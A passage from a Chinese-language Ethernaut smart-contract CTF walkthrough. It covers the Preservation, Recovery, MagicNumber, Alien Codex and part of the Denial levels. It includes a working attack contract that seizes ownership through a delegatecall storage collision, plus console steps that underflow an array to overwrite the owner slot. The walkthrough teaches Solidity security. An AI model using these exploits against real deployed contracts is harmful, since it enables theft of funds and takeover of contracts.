<span class="w">    </span><span class="nx">timeZone2Library</span><span class="p">.</span><span class="nx">delegatecall</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">setTimeSignature</span><span class="p">,</span><span class="w"> </span><span class="nx">_timeStamp</span><span class="p">));</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">LibraryContract</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">uint</span><span class="w"> </span><span class="nx">storedTime</span><span class="p">;</span><span class="w">  </span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">setTime</span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">_time</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">storedTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_time</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Hack</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="c1">// Make sure the storage layout is the same as Preservation</span>
<span class="w">  </span><span class="c1">// This will allow us to correctly update the state variables</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">timeZone1Library</span><span class="p">;</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">timeZone2Library</span><span class="p">;</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">owner</span><span class="p">;</span><span class="w"> </span>
<span class="w">  </span><span class="nx">uint</span><span class="w"> </span><span class="nx">storedTime</span><span class="p">;</span>

<span class="w">  </span><span class="nx">Preservation</span><span class="w"> </span><span class="nx">preservation</span><span class="p">;</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">preservation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Preservation</span><span class="p">(</span><span class="nx">instance</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">attack</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="c1">// override address of timeZone1Library</span>
<span class="w">      </span><span class="nx">preservation</span><span class="p">.</span><span class="nx">setFirstTime</span><span class="p">(</span><span class="nx">uint</span><span class="p">(</span><span class="nx">uint160</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">))));</span>
<span class="w">      </span><span class="c1">// change the owner</span>
<span class="w">      </span><span class="nx">preservation</span><span class="p">.</span><span class="nx">setFirstTime</span><span class="p">(</span><span class="mf">1</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="c1">// function signature must match LibraryContract.setTimeSignature</span>
<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">setTime</span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">_time</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">;</span>
<span class="w">      </span><span class="nx">_time</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>库应使用 <code>library</code> 来声明</li>
<li><code>library</code> 与 <code>contract</code> 类似，但不能声明任何状态变量或向其发送以太</li>
</ul>
<h3 id="_12">参考资料<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://solidity-by-example.org/hacks/delegatecall/">Delegatecall | Solidity by Example</a></li>
<li><a href="https://solidity-by-example.org/library/">Library | Solidity by Example</a></li>
</ul>
<h2 id="17-recovery">17. Recovery<a class="headerlink" href="#17-recovery" title="Permanent link">&para;</a></h2>
<p>从遗失的合约地址中找回 0.5 以太</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Recovery</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="c1">//generate tokens</span>
<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">generateToken</span><span class="p">(</span><span class="nx">string</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">_name</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">_initialSupply</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="ow">new</span><span class="w"> </span><span class="nx">SimpleToken</span><span class="p">(</span><span class="nx">_name</span><span class="p">,</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">_initialSupply</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">SimpleToken</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">string</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">name</span><span class="p">;</span>
<span class="w">  </span><span class="nx">mapping</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">uint</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">balances</span><span class="p">;</span>

<span class="w">  </span><span class="c1">// constructor</span>
<span class="w">  </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">string</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">_name</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">_creator</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">_initialSupply</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_name</span><span class="p">;</span>
<span class="w">    </span><span class="nx">balances</span><span class="p">[</span><span class="nx">_creator</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_initialSupply</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="c1">// collect ether in return for tokens</span>
<span class="w">  </span><span class="nx">receive</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">10</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="c1">// allow transfers of tokens</span>
<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_to</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">_amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span><span class="w"> </span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">_amount</span><span class="p">);</span>
<span class="w">    </span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">_amount</span><span class="p">;</span>
<span class="w">    </span><span class="nx">balances</span><span class="p">[</span><span class="nx">_to</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_amount</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="c1">// clean up after ourselves</span>
<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">destroy</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="nx">_to</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">selfdestruct</span><span class="p">(</span><span class="nx">_to</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>已知合约 <code>Recovery</code> 的地址，需要恢复其中创建的合约 <code>SimpleToken</code> 里的以太，但合约 <code>SimpleToken</code> 创建后没有赋值给变量</li>
<li>不过信息都是公开的嘛！使用合约 <code>Recovery</code> 的地址在 <a href="https://goerli.etherscan.io/address/0x518c2143bdd79d3bc060bc4883d92d545d3e3bb0#internaltx">Etherscan</a> 找到交易信息，其中就包括合约创建 ΦωΦ 合约 <code>SimpleToken</code> 实例的地址 GET ✔️ <br>
<img alt="Contract Creation" src="../img/ethernaut06.jpg" /></li>
<li>在 Remix 添加合约 <code>SimpleToken</code> 的源码，通过 <code>At Address</code> 引用合约<br>
<img alt="At Address" src="../img/ethernaut07.jpg" /></li>
<li>接下来调用 <code>destroy</code> 函数就可以取回以太啦 XD</li>
<li>
<p>实际上，合约地址都是确定性的，通过合约创建者（<code>sender</code>）的地址 <code>address</code> 以及由创建者发起的交易的数量 <code>nonce</code> 计算获得</p>
<ul>
<li>根据 <a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-161.md#specification">EIP 161</a>，初始 <code>nonce</code> 为 <span class="arithmatex">\(1\)</span></li>
</ul>
<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">rlp</span>
<span class="kn">from</span> <span class="nn">eth_utils</span> <span class="kn">import</span> <span class="n">keccak</span><span class="p">,</span> <span class="n">to_checksum_address</span><span class="p">,</span> <span class="n">to_bytes</span>

<span class="k">def</span> <span class="nf">mk_contract_address</span><span class="p">(</span><span class="n">sender</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">nonce</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
<span class="w">  </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">  Create a contract address using eth-utils.</span>
<span class="sd">  &quot;&quot;&quot;</span>
  <span class="n">sender_bytes</span> <span class="o">=</span> <span class="n">to_bytes</span><span class="p">(</span><span class="n">hexstr</span><span class="o">=</span><span class="n">sender</span><span class="p">)</span>
  <span class="n">address_bytes</span> <span class="o">=</span> <span class="n">keccak</span><span class="p">(</span><span class="n">rlp</span><span class="o">.</span><span class="n">encode</span><span class="p">([</span><span class="n">sender_bytes</span><span class="p">,</span> <span class="n">nonce</span><span class="p">]))[</span><span class="mi">12</span><span class="p">:]</span>
  <span class="k">return</span> <span class="n">to_checksum_address</span><span class="p">(</span><span class="n">address_bytes</span><span class="p">)</span>

<span class="n">mk_contract_address</span><span class="p">(</span><span class="n">to_checksum_address</span><span class="p">(</span><span class="s2">&quot;0x518C2143bDd79d3bc060BC4883d92D545D3E3bb0&quot;</span><span class="p">),</span> <span class="mi">1</span><span class="p">)</span>
<span class="c1"># 0x53D144BcF44de3DeE630b1CFEabD91AC3d3caF5a</span>
</code></pre></div>
</li>
<li>
<p>因此，可以将以太币发送到预确定的地址，随后在指定地址创建合约来恢复以太币，实现无私钥保存以太币</p>
</li>
</ul>
<h3 id="_13">参考资料<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed">How is the address of an Ethereum contract computed?</a></li>
<li><a href="https://ethereum.stackexchange.com/questions/6429/normal-transactions-vs-internal-transactions-in-etherscan">Normal transactions VS. Internal transactions in etherscan - Ethereum Stack Exchange</a></li>
</ul>
<h2 id="18-magicnumber">18. MagicNumber<a class="headerlink" href="#18-magicnumber" title="Permanent link">&para;</a></h2>
<ul>
<li>部署合约 <code>Solver</code>，包含函数 <code>whatIsTheMeaningOfLife()</code>，需要返回正确的数，即 <code>42</code></li>
<li>代码最多只能包含 10 个操作码，可能需要人工编写 EVM 字节码 😱</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">MagicNum</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">solver</span><span class="p">;</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">setSolver</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_solver</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">solver</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_solver</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="cm">/*</span>
<span class="cm">    ____________/\\\_______/\\\\\\\\\_____        </span>
<span class="cm">     __________/\\\\\_____/\\\///////\\\___       </span>
<span class="cm">      ________/\\\/\\\____\///______\//\\\__      </span>
<span class="cm">       ______/\\\/\/\\\______________/\\\/___     </span>
<span class="cm">        ____/\\\/__\/\\\___________/\\\//_____    </span>
<span class="cm">         __/\\\\\\\\\\\\\\\\_____/\\\//________   </span>
<span class="cm">          _\///////////\\\//____/\\\/___________  </span>
<span class="cm">           ___________\/\\\_____/\\\\\\\\\\\\\\\_ </span>
<span class="cm">            ___________\///_____\///////////////__</span>
<span class="cm">  */</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>EVM 执行字节码，并不知道函数名、参数名等信息</li>
<li>通过 ABI，其它合约能够调用指定合约的函数</li>
<li>
<p>无论被调用的函数名是什么都将返回 <span class="arithmatex">\(42\)</span> 的合约 👇🏻</p>
<div class="highlight"><pre><span></span><code>60 0a
60 0c
60 00
39  // copy code into memory
60 0a
60 00
f3  // return code

60 2a
60 00
52  // push 42 into memory
60 20
60 00
f3  // return
</code></pre></div>
</li>
<li>
<p>由外部账户发起没有 <code>to</code> 地址的转账交易，并将合约的 bytecode 放在 <code>data</code> 域即可创建合约</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="kd">let</span><span class="w"> </span><span class="nx">bytecode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;600a600c600039600a6000f3602a60005260206000f3&quot;</span><span class="p">;</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">sendTransaction</span><span class="p">({</span><span class="s2">&quot;data&quot;</span><span class="o">:</span><span class="w"> </span><span class="nx">bytecode</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;from&quot;</span><span class="o">:</span><span class="w"> </span><span class="nx">player</span><span class="p">})</span>
<span class="nb">Object</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">blockHash</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;0x91be4e10a259695dc64e5feea7b875135dfc3f96f1b649554761514f4282c815&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">blockNumber</span><span class="o">:</span><span class="w"> </span><span class="mf">8034615</span><span class="p">,</span><span class="w"> </span><span class="nx">contractAddress</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;0x59B38CC5e23Ac1aE9c93A4c73CA1fA9c1A149736&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">...</span><span class="w"> </span><span class="p">}</span>
</code></pre></div>
</li>
<li>
<p>接下来调用实例的 <code>setSolver</code> 就好啦 =v=</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">setSolver</span><span class="p">(</span><span class="s2">&quot;0x59B38CC5e23Ac1aE9c93A4c73CA1fA9c1A149736&quot;</span><span class="p">);</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">solver</span><span class="p">();</span>
<span class="s2">&quot;0x59B38CC5e23Ac1aE9c93A4c73CA1fA9c1A149736&quot;</span>
</code></pre></div>
</li>
</ul>
<h3 id="_14">参考资料<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://www.ethervm.io/">Ethereum Virtual Machine Opcodes</a></li>
<li><a href="https://hackmd.io/@e18r/r1yM3rCCd">EVM bytecode programming - HackMD</a></li>
<li><a href="https://ethereum.stackexchange.com/questions/234/what-is-an-abi-and-why-is-it-needed-to-interact-with-contracts">evm - What is an ABI and why is it needed to interact with contracts? - Ethereum Stack Exchange</a></li>
</ul>
<h2 id="19-alien-codex">19. Alien Codex<a class="headerlink" href="#19-alien-codex" title="Permanent link">&para;</a></h2>
<p>声明对合约实例的所有权</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.5.0</span><span class="p">;</span>

<span class="k">import</span><span class="w"> </span><span class="s1">&#39;../helpers/Ownable-05.sol&#39;</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">AlienCodex</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">Ownable</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">bool</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">contact</span><span class="p">;</span>
<span class="w">  </span><span class="nx">bytes32</span><span class="p">[]</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">codex</span><span class="p">;</span>

<span class="w">  </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">contacted</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">assert</span><span class="p">(</span><span class="nx">contact</span><span class="p">);</span>
<span class="w">    </span><span class="nx">_</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">make_contact</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">contact</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">record</span><span class="p">(</span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">_content</span><span class="p">)</span><span class="w"> </span><span class="nx">contacted</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">codex</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">_content</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">retract</span><span class="p">()</span><span class="w"> </span><span class="nx">contacted</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">codex</span><span class="p">.</span><span class="nx">length</span><span class="o">--</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">revise</span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">i</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">_content</span><span class="p">)</span><span class="w"> </span><span class="nx">contacted</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">codex</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_content</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>合约继承中，父合约 <a href="https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/contracts/helpers/Ownable-05.sol"><code>Ownable</code></a> 的代码将全部拷贝至子合约 <code>AlienCodex</code>，包括变量 <code>owner</code></li>
<li>根据提示 <code>Understanding how array storage works</code>，显然重点在数组 <code>codex</code> 上</li>
<li>
<p>动态数组与静态变量的存储方式（可参考 <a href="#12-privacy">Privacy</a>）不同，但仍根据静态变量的存储规则占用一个 <code>slot p</code>，用于存储数组长度，数组偏移量为 <code>keccak(p)</code>，数组元素的存储方式与静态数组相同</p>
<ul>
<li>数组元素偏移量为 <code>keccak(p) + (index * elementSize)</code></li>
<li>
<p><code>codex</code> 占用 <code>slot 1</code>，计算数组偏移量</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">utils</span><span class="p">.</span><span class="nx">soliditySha3</span><span class="p">({</span><span class="w"> </span><span class="nx">type</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;uint&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span><span class="w"> </span><span class="p">})</span>
<span class="s2">&quot;0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6&quot;</span>
</code></pre></div>
</li>
</ul>
</li>
<li>
<p>地址长度为 32 字节，所以总共有 <span class="arithmatex">\(2^{256}\)</span> 个 slot，那么，想要修改 <code>slot 0</code> 的 <code>owner</code>，需要修改下标为 <code>0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a</code> 的数组元素</p>
</li>
<li>
<p>操作数组 <code>codex</code> 需要 <code>contact</code> 为 <code>true</code></p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span>
<span class="s2">&quot;0x000000000000000000000000da5b3fb76c78b6edee6be8f11a1c31ecfb02b272&quot;</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">make_contact</span><span class="p">()</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">contact</span><span class="p">()</span>
<span class="kc">true</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span>
<span class="s2">&quot;0x000000000000000000000001da5b3fb76c78b6edee6be8f11a1c31ecfb02b272&quot;</span>
<span class="c1">// slot 0 存储了变量 owner 和 contact 的值</span>
</code></pre></div>
</li>
<li>
<p>使用 <code>retract</code> 使数组长度下溢出，从而能修改目标下标的元素</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">retract</span><span class="p">();</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="mf">1</span><span class="p">);</span>
<span class="s2">&quot;0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&quot;</span>
</code></pre></div>
</li>
<li>
<p>修改 <code>owner</code></p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">revise</span><span class="p">(</span><span class="s2">&quot;0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;0x0000000000000000000000017Fb8134848aDe56fF213eC49edBbB1D830853289&quot;</span><span class="p">);</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span>
<span class="s2">&quot;0x0000000000000000000000017fb8134848ade56ff213ec49edbbb1d830853289&quot;</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">owner</span><span class="p">();</span>
<span class="s2">&quot;0x7Fb8134848aDe56fF213eC49edBbB1D830853289&quot;</span>
</code></pre></div>
</li>
</ul>
<h3 id="_15">参考资料<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://docs.soliditylang.org/en/v0.5.0/contracts.html#inheritance">Inheritance</a></li>
<li><a href="https://docs.soliditylang.org/en/v0.8.14/internals/layout_in_storage.html">Layout of State Variables in Storage</a></li>
<li><a href="https://solidity-by-example.org/hacks/accessing-private-data/">Accessing Private Data | Solidity by Example</a></li>
</ul>
<h2 id="20-denial">20. Denial<a class="headerlink" href="#20-denial" title="Permanent link">&para;</a></h2>
<p>阻止 <code>owner</code> 在投资人调用 <code>withdraw()</code> 时获利</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>
<span class="nx">contract</span><span class="w"> </span><span class="nx">Denial</span><span class="w"> </span><span class="p">{</span>

<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">partner</span><span class="p">;</span><span class="w"> </span><span class="c1">// withdrawal partner - pay the gas, split the withdraw</span>
<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="mh">0xA9E</span><span class="p">);</span>
<span class="w">    </span><span class="nx">uint</span><span class="w"> </span><span class="nx">timeLastWithdrawn</span><span class="p">;</span>
<span class="w">    </span><span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">uint</span><span class="p">)</span><span class="w"> </span><span class="nx">withdrawPartnerBalances</span><span class="p">;</span><span class="w"> </span><span class="c1">// keep track of partners balances</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">setWithdrawPartner</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_partner</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">partner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_partner</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// withdraw 1% to recipient and 1% to owner</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">withdraw</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">uint</span><span class="w"> </span><span class="nx">amountToSend</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">100</span><span class="p">;</span>
<span class="w">        </span><span class="c1">// perform a call without checking return</span>
<span class="w">        </span><span class="c1">// The recipient can revert, the owner will still get their share</span>
